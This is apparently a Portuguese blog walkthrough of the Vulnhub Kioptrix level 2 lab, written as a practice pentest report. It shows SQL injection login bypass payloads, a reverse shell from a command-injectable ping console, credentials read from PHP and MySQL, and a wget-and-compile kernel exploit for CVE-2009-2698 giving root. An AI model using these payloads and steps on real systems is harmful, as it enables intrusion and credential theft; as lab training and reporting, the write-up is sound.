---
title: "Vulnhub Kioptrix level 2"
layout: post
author: Pr34ch3r
categories: ctf, vulnhub
---
# Kioptrix level 2 Walkthrough

![teste](/blog/assets/images/k2-0.png)

## Introdução

Essa foi a segunda máquina em que consegui obter root. Dessa vez tive menos trabalho pois segui o padrão que aprendi na primeira: Enumere o máximo que puder, use muito o google e daí explore as vulnerabilidades que encontrar.

Meu objetivo com esse walkthrough é praticar a documentação de *pentest*, pois no final das contas, o que importa para uma empresa ao contratar um pentest é ter um relatório bem escrito.

Pois bem, vamos ao que interessa.

**IP da máquina**

10.0.2.15

## Enumeração de Serviços

Nessa fase faço uma varredura de portas e serviços rodando em servidor. Alguns serviços estão desatualizados, sendo passíveis de serem atacados usando exploits públicos. Há várias ferramentas para fazer essas varreduras, mas a mais utilizada é o **Nmap**.

Endereço IP       | Portas Abertas
------------------|----------------------------------------
10.0.2.15         | **TCP**: 22,80,111,443,631

**comando**: *nmap -sV -A -oN kio2-nmap 10.0.2.15*

Resultado do Nmap:

```bash
$ cat kio2-nmap
# Nmap 7.93 scan initiated Mon Aug  7 18:43:30 2023 as: nmap -sV -A -oN kio2-nmap 10.0.2.15
Nmap scan report for 10.0.2.15
Host is up (0.00057s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
|   1024 346b453dbacecab25355ef1e43703836 (DSA)
|_  1024 684d8cbbb65abd7971b87147ea004261 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            858/udp   status
|_  100024  1            861/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssl-date: 2023-08-08T02:43:50+00:00; +3h59m58s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:A6:DC:AE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: 3h59m57s

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms 10.0.2.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  7 18:44:06 2023 -- 1 IP address (1 host up) scanned in 36.16 seconds

```

## Exploração

Nessa fase uso as informações obtidas para se aproveitar de vulnerabilidades encontradas nesses serviços. Durante esse Pentest foi encontrada uma falha de SQL injection na página de login do site. A seguir pode-se ver o passo a passo da exploração:

Primeiramente, ao acessar a url do site 10.0.2.15/index.php, encontramos uma página de login, como pode-se ver na gravura a seguir:

![página de login](https://raw.githubusercontent.com/Pre4ch3r/blog/_posts/kioptrix_2/kioptrix_2_image/k2-0.png)

Rodando a ferramenta sqlmap, verifiquei se a página tinha vulnerabilidade a ataques de SQL injection. O sqlmap retornou que o formulário de login era vulnerável a ataques *booleanos*, ou seja, condicionais de verdadeiro ou falso. Na gravura a seguir vemos uma amostra do resultado:

![sqlmap](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-1.png)

**Vulnerabilidade:** SQL injection Boolean-Based

**Explicação:** 
Quando o código inserido pelo usuário não é apropriadamente sanitizado, um usuário mal intencionado pode injetar *queries sql*, que são comandos na linguagem do banco de dados. O servidor aceitará esses comandos como confiáveis e retornará ao hacker a informação solicitada. Esse é um dos ataques mais comuns, sendo listado no top 10 da OWASP.
Um sql injection boolean-based abusa da lógica de parâmetros de verdadeiro e falso. 

Exemplo: 

```bash
admin'or 1=1-- -

```

Esse código diz que o banco de dados deve verificar a existência de um usuário chamado admin. Mas ao adicionar a aspa simples " ' ", o servidor passa a ler o restante do código como uma query sql. O próximo trecho diz que a condição para o servidor liberar o acesso ao usuário é se 1 for igual a 1. Como essa condição é verdadeira, o acesso é facilmente burlado.

**Solução:** Sanitizar todo input (entradas) feito pelo usuário. Outra solução é usar uma lista branca de caracteres especiais que são permitidos aos usuários. Caracteres proibidos são filtrados pelo servidor. Além disso, erros de servidor não devem ser retornados ao usuário.


**Risco:** Alto

**Prova de Conceito:**
Trecho do sqlmap que contém o payload usado:

```bash
[19:08:16] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 574 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-2741' OR 9983=9983-- GTFZ&psw=&btnLogin=Login

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: uname=VBUI' AND 7493=BENCHMARK(5000000,MD5(0x5144416e))-- QIiT&psw=&btnLogin=Login
---
do you want to exploit this SQL injection? [Y/n] y
[19:09:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 4
web application technology: Apache 2.0.52, PHP 4.3.9
back-end DBMS: MySQL < 5.0.12
[19:09:56] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-08072023_0707pm.csv'
[19:09:56] [WARNING] your sqlmap version is outdated

[*] ending @ 19:09:56 /2023-08-07/


```
Após usar o payload no formulário, encontrei a página seguinte:
 
![página acessada](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-2.png)

**Vulnerabilidade:** Remote Command Execution

**Explicação:**
Uma falha na hora de sanitizar o input do usuário pode permitir que este injete comandos de servidor diretamente no formulário web. O servidor retorna os resultados na pŕopria página web. Essa falha pode ser escalada por se criar um *reverse shell* para que o hacker possa interagir com o servidor remotamente.

**Solução:** Filtrar comandos de servidor que forem passados pelo usuário.


**Risco:** Alto

**Prova de Conceito:**
Na gravura a seguir vemos que o formulário é uma espécie de *web console* que realiza um comando **ping -c 3 < ip-da-máquina >**. Ao realizar um ping para o google.com, vemos o resultado abaixo:

![ping 8.8.8.8](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-3.png)

Por receber comandos do usuário e realizar no servidor, usei a tecnica de criar um shell reverso usando o web console:

![web console injetado](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-4.png)

Trecho do acesso remoto ao servidor e obtenção de credenciais:

```bash
#obtendo shell reversa
$ nc -lnvp 1234                                                   
listening on 1234 ...                           
connect to [10.0.2.11] from [10.0.2.15] 32782
bash:no job control in this shell 
$ python -c 'import pty;pty.spawn("/bin/bash")'
bash-3$ export TERM=xterm-256color
bash-3$^Z
$ stty raw -echo;fg
[1] + continued  nc -lnvp 1234   
bash-3$ clear
bash-3$ ls
index.php pingit.php 
bash-3$ ls -la
total 24
drwxr-xr-x 2 root root 4096 Oct  8  2009 .
drwxr-xr-x 8 root root 4096 Oct  7  2009 ..
-rwxr-Sr-t 1 root root 1733 Feb  9  2012 index.php
-rwxr-Sr-t 1 root root  199 Oct  8  2009 pingit.php
#arquivo index.php contem a senha do usuario john no mysql
bash-3$ cat index.php
<?php
       mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
       //print "Connected to MySQL <br/>";
        mysql_select_db("webapp");

#acessando mysql

bash-3$ mysql -u john
ERROR 1045(28000): Access denied for user 'john'@'localhost' (using password: NO)
bash-3$mysql -u john -p
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g.
MySQL connection id is 24631 to server version: 4.1.22
Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

#conectando ao banco de dados
mysql> show databases;
+----------+
| Database |
+----------+
| mysql    |
| test     |
| webapp   |
+----------+
3 rows in set (0.01 sec)

mysql>use webapp

Database changed

#lendo a table 'users'

mysql> select * from users;
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
|    1 | admin    | 5afac8d85f |
|    2 | john     | 66lajGGbla |
+------+----------+------------+
2 rows in set (0.00 sec)

mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| func                      |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
15 rows in set (0.00 sec)

mysql> select User,Password from user;
+------+------------------+
| User | Password         |
+------+------------------+
| root | 5a6914ba69e02807 |
| root | 5a6914ba69e02807 |
|      |                  |
|      |                  |
| john | 5a6914ba69e02807 |
+------+------------------+
5 rows in set (0.00 sec)


```
Shell obtida:

![shell reversa](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-5.png)

## Pós exploração

Nessa fase procuro elevar os privilégios de usuário e manter acesso persistente na máquina alvo. O alvo era vulnerável a uma falha no kernel linux, na sua versão 2.6.19. Para saber a versão do kernel no linux use o comando *uname -a*.

**Vulnerabilidade:** CVE-2009-2698

**Explicação:**
A função udp_sendmsg na implementação do UDP em (1) net/ipv4/udp.c e (2) net/ipv6/udp.c no kernel do Linux antes de 2.6.19 permite que os usuários locais *obtenham privilégios* ou causem uma negação de serviço (desreferência de ponteiro NULL e falha do sistema) por meio de vetores que envolvem o sinalizador MSG_MORE e um soquete UDP.

**Solução:** Atualizar o kernel para versões mais recentes.


**Risco:** Crítico

**Prova de Conceito:**
Trecho do uso do exploit **0x82-CVE-2009-269** que pode ser encontrado no GitHub:

```bash
#upando da minha máquina para a máquina alvo
bash-3$ wget http://10.0.2.11:8000/0x82-CVE-2009-2698.c
--07:17:01-- http://10.0.2.11:8000/0x82-CVE-2009-2698.c
           => 0x82-CVE-2009-2698.c
Connecting to 10.0.2.11:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K)[text/x-csrc]
                                                                                                                                                                     
100%[====================================>] 2,535        --.--K/s
                                                                                                                                                                     
07:17:01 (12.46 MB/s) - 0x82-CVE-2009-2698.c saved [2535/2535]  

#compilando o código de acordo com as instruções no próprio exploit

bash-3.00$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-269

0x82-CVE-2009-2698.c:109:28: warning: no newline at end of file

sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)

```
Após mudar a senha do root usando o comando *passwd*, acessei o servidor via *ssh*. A gravura a seguir mostra o comando e acesso root ao servidor.

![pwned!](https://raw.githubusercontent.com/Pre4ch3r/blog/assets/images/kioptrix_2_image/k2-6.png)

# Considerações Finais

Após todas as descobertas, podemos resumir os achados da seguinte forma:

vulnerabilidades      | Risco
----------------------|-----------------------
2                     | Alto
1                     | Crítico


Nessa máquina aprendi um pouco mais sobre *sqlinjection*, *kernel exploit* e má sanitização de *inputs* de usuários. Se você também está numa jornada de aprendizado de pentest, lembre-se: É mais importante entender o processo do que chegar rapidamente ao root. As empresas não se importam se você é o mr Robot e consegue rootar qualquer máquina do *hackthebox*. O que elas querem é saber se você sabe como solucionar as vulnerabilidades que podem custar muito dinheiro em prejuízo para elas. Entender o processo e os porquês de cada falha, bem como saber qual solução é a mais apropriada é o que diferencia um pentester de um *scriptkiddie*. Até o próximo walkthrough.
